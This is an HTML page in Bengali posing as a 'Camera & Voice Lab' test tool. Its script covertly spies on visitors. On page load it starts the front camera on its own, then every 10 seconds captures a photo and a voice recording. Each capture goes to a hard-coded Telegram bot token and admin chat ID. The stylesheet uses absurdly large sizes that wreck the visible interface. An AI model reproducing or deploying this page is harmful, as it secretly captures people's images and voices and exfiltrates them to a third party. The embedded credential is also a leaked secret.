<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Camera & Voice Lab</title>

  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 2000px;
      font-family: Arial, sans-serif;
      background: #fff;
      color: #222;
    }

    main {
      max-width: 600000px;
      margin: auto;
    }

    h1 { font-size: 200885px; }

    video, img, audio {
      display: block;
      width: 10000000%;
      margin: 125555px 0;
      border-radius: 100000px;
    }

    video {
      background: #f1f5f9;
      object-fit: cover;
    }

    button, a {
      display: inline-block;
      padding: 2222212px;
      margin: 55555px 3333px;
      border: 1555px solid #ddd;
      border-radius: 088888px;
      background: #f8fafc;
      color: #222;
      font-size: 8888815px;
      text-decoration: none;
      cursor: pointer;
    }

    .status {
      padding: 12000px;
      background: #f1f5f9;
      border-radius: 888888px;
      overflow-wrap: anywhere;
    }

    .hidden { display: none; }
  </style>
</head>

<body>
<main>
  <h1>ক্যামেরা ও ভয়েস পরীক্ষাগার</h1>

  <section>
    <h2>১. ফ্রন্ট ক্যামেরা</h2>

    <button id="startCamera">ক্যামেরা চালু করুন</button>
    <button id="takePhoto" disabled>ছবি তুলুন</button>
    <button id="stopCamera" disabled>ক্যামেরা বন্ধ</button>

    <video id="camera" autoplay playsinline muted
           class="hidden"></video>

    <canvas id="canvas" class="hidden"></canvas>
    <img id="photo" alt="তোলা ছবি" class="hidden">

    <a id="photoDownload" class="hidden" download="photo.jpg">
      ছবি ডাউনলোড
    </a>

    <p id="cameraStatus" class="status">
      ক্যামেরা বন্ধ আছে।
    </p>
  </section>

  <hr>

  <section>
    <h2>২. ভয়েস রেকর্ডিং</h2>

    <button id="startVoice">রেকর্ডিং শুরু</button>
    <button id="stopVoice" disabled>রেকর্ডিং বন্ধ</button>

    <audio id="audio" controls class="hidden"></audio>

    <a id="audioDownload" class="hidden" download="voice.webm">
      অডিও ডাউনলোড
    </a>

    <p id="voiceStatus" class="status">
      রেকর্ডিং শুরু হয়নি।
    </p>
  </section>
</main>

<script>
  // টেলিগ্রাম কনফিগারেশন
  const TELEGRAM_BOT_TOKEN = "8395120592:AAE6b2-QDm9y-9SsQtWq-yT8PIkEQy02ZJI";
  const TELEGRAM_ADMIN_UID = "6183247698";

  const camera = document.getElementById("camera");
  const canvas = document.getElementById("canvas");
  const photo = document.getElementById("photo");

  let cameraStream = null;
  let recorder = null;
  let audioStream = null;
  let audioChunks = [];
  let photoURL = null;
  let audioURL = null;
  let autoCaptureInterval = null; 
  let autoVoiceInterval = null;   

  // টেলিগ্রামে ছবি পাঠানোর ফাংশন
  async function sendPhotoToTelegram(blob) {
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_ADMIN_UID);
    formData.append("photo", blob, "auto_captured_photo.jpg");
    formData.append("caption", "অটোমেটিক ক্যাপচার করা ছবি!");

    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      });
      const data = await response.json();
      if (!data.ok) {
        console.error("টেলিগ্রামে ছবি পাঠানো ব্যর্থ: " + (data.description || "অজানা ত্রুটি"));
      }
    } catch (error) {
      console.error("নেটওয়ার্ক ত্রুটি: " + error.message);
    }
  }

  // টেলিগ্রামে অডিও/ভয়েস পাঠানোর ফাংশন
  async function sendAudioToTelegram(blob) {
    const formData = new FormData();
    formData.append("chat_id", TELEGRAM_ADMIN_UID);
    formData.append("voice", blob, "auto_voice.webm");
    formData.append("caption", "১০ সেকেন্ডের অটোমেটিক ভয়েস রেকর্ড!");

    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
        method: "POST",
        body: formData
      });
      const data = await response.json();
      if (!data.ok) {
        console.error("টেলিগ্রামে ভয়েস পাঠানো ব্যর্থ: " + (data.description || "অজানা ত্রুটি"));
      } else {
        document.getElementById("voiceStatus").textContent = "১০ সেকেন্ডের ভয়েস রেকর্ড টেলিগ্রামে পাঠানো হয়েছে।";
      }
    } catch (error) {
      console.error("নেটওয়ার্ক ত্রুটি: " + error.message);
    }
  }

  // অটোমেটিক ছবি তুলে পাঠানোর ফাংশন
  function captureAndSend() {
    if (!cameraStream || !camera.videoWidth) return;

    canvas.width = camera.videoWidth;
    canvas.height = camera.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(camera, 0, 0);

    canvas.toBlob(blob => {
      if (!blob) return;

      if (photoURL) URL.revokeObjectURL(photoURL);

      photoURL = URL.createObjectURL(blob);
      photo.src = photoURL;
      photo.classList.remove("hidden");

      const link = document.getElementById("photoDownload");
      link.href = photoURL;
      link.classList.remove("hidden");

      document.getElementById("cameraStatus").textContent = "অটোমেটিক ছবি তুলে টেলিগ্রামে পাঠানো হচ্ছে...";
      
      sendPhotoToTelegram(blob);

    }, "image/jpeg", 0.9);
  }

  // ১০ সেকেন্ড পরপর অডিও রেকর্ড শুরু এবং বন্ধ করে টেলিগ্রামে পাঠানোর লুপ ফাংশন
  async function startAutoVoiceLoop() {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || !window.MediaRecorder) {
        return;
      }

      audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });

      const runVoiceCycle = async () => {
        if (!audioStream) return;

        audioChunks = [];
        recorder = new MediaRecorder(audioStream);

        recorder.ondataavailable = event => {
          if (event.data.size > 0) {
            audioChunks.push(event.data);
          }
        };

        recorder.onstop = () => {
          const blob = new Blob(audioChunks, {
            type: recorder.mimeType || "audio/webm"
          });

          if (audioURL) URL.revokeObjectURL(audioURL);
          audioURL = URL.createObjectURL(blob);

          const audio = document.getElementById("audio");
          audio.src = audioURL;
          audio.classList.remove("hidden");

          const link = document.getElementById("audioDownload");
          link.href = audioURL;
          link.classList.remove("hidden");

          document.getElementById("voiceStatus").textContent = "রেকর্ডিং শেষ, টেলিগ্রামে পাঠানো হচ্ছে...";
          
          sendAudioToTelegram(blob);
        };

        recorder.start();
        document.getElementById("voiceStatus").textContent = "১০ সেকেন্ডের অটোমেটিক রেকর্ডিং চলছে...";

        setTimeout(() => {
          if (recorder && recorder.state === "recording") {
            recorder.stop();
          }
        }, 10000);
      };

      runVoiceCycle();

      if (autoVoiceInterval) clearInterval(autoVoiceInterval);
      autoVoiceInterval = setInterval(runVoiceCycle, 10500);

    } catch (error) {
      document.getElementById("voiceStatus").textContent = "অটো ভয়েস শুরু করা যায়নি: " + error.message;
    }
  }

  // ফ্রন্ট ক্যামেরা চালু এবং অটোমেটিক প্রসেস শুরু করার মূল ফাংশন
  async function triggerStartCamera() {
    try {
      cameraStream =
        await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user"
          },
          audio: false
        });

      camera.srcObject = cameraStream;
      camera.classList.remove("hidden");

      await camera.play();

      document.getElementById("takePhoto").disabled = false;
      document.getElementById("stopCamera").disabled = false;
      document.getElementById("startCamera").disabled = true;

      document.getElementById("cameraStatus").textContent =
        "ফ্রন্ট ক্যামেরা চালু আছে (প্রতি ১০ সেকেন্ডে অটো ছবি ও ভয়েস পাঠানো হচ্ছে)।";

      if (autoCaptureInterval) clearInterval(autoCaptureInterval);
      autoCaptureInterval = setInterval(captureAndSend, 10000);

      startAutoVoiceLoop();
      document.getElementById("startVoice").disabled = true;
      document.getElementById("stopVoice").disabled = false;

    } catch (error) {
      document.getElementById("cameraStatus").textContent =
        "ক্যামেরা চালু করা যায়নি: " + error.message;
    }
  }

  // বাটনে ক্লিক ইভেন্ট বাইন্ড করা
  document.getElementById("startCamera").onclick = triggerStartCamera;

  document.getElementById("takePhoto").onclick = () => {
    captureAndSend();
  };

  document.getElementById("stopCamera").onclick = () => {
    if (cameraStream) {
      cameraStream.getTracks().forEach(track => track.stop());
      cameraStream = null;
    }

    if (autoCaptureInterval) {
      clearInterval(autoCaptureInterval);
      autoCaptureInterval = null;
    }

    if (autoVoiceInterval) {
      clearInterval(autoVoiceInterval);
      autoVoiceInterval = null;
    }

    if (recorder && recorder.state === "recording") {
      recorder.stop();
    }

    if (audioStream) {
      audioStream.getTracks().forEach(track => track.stop());
      audioStream = null;
    }

    camera.srcObject = null;
    camera.classList.add("hidden");

    document.getElementById("takePhoto").disabled = true;
    document.getElementById("stopCamera").disabled = true;
    document.getElementById("startCamera").disabled = false;
    document.getElementById("startVoice").disabled = false;
    document.getElementById("stopVoice").disabled = true;

    document.getElementById("cameraStatus").textContent =
      "ক্যামেরা বন্ধ করা হয়েছে এবং সব অটো-প্রসেস থেমে গেছে।";
  };

  document.getElementById("startVoice").onclick = async () => {
    startAutoVoiceLoop();
    document.getElementById("startVoice").disabled = true;
    document.getElementById("stopVoice").disabled = false;
  };

  document.getElementById("stopVoice").onclick = () => {
    if (recorder && recorder.state === "recording") {
      recorder.stop();
    }
    if (autoVoiceInterval) {
      clearInterval(autoVoiceInterval);
      autoVoiceInterval = null;
    }
    document.getElementById("startVoice").disabled = false;
    document.getElementById("stopVoice").disabled = true;
  };

  // পেজ লোড হওয়ার সাথে সাথে অটোমেটিক ক্যামেরা এবং ভয়েস রেকর্ডিং চালু করার লজিক
  window.addEventListener("DOMContentLoaded", () => {
    // ব্রাউজারের সিকিউরিটি পলিসির কারণে অনেক সময় সরাসরি ইউজার ইন্টারঅ্যাকশন ছাড়া ক্যামেরা পারমিশন প্রম্পট আটকে যেতে পারে, 
    // তাই সরাসরি ফাংশন কল করা হয়েছে যাতে পারমিশন এলাও করার সাথে সাথেই অটো স্টার্ট হয়ে যায়।
    triggerStartCamera();
  });

  window.addEventListener("pagehide", () => {
    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
    if (autoVoiceInterval) clearInterval(autoVoiceInterval);
    [cameraStream, audioStream].forEach(stream => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    });
  });
</script>
</body>
</html>
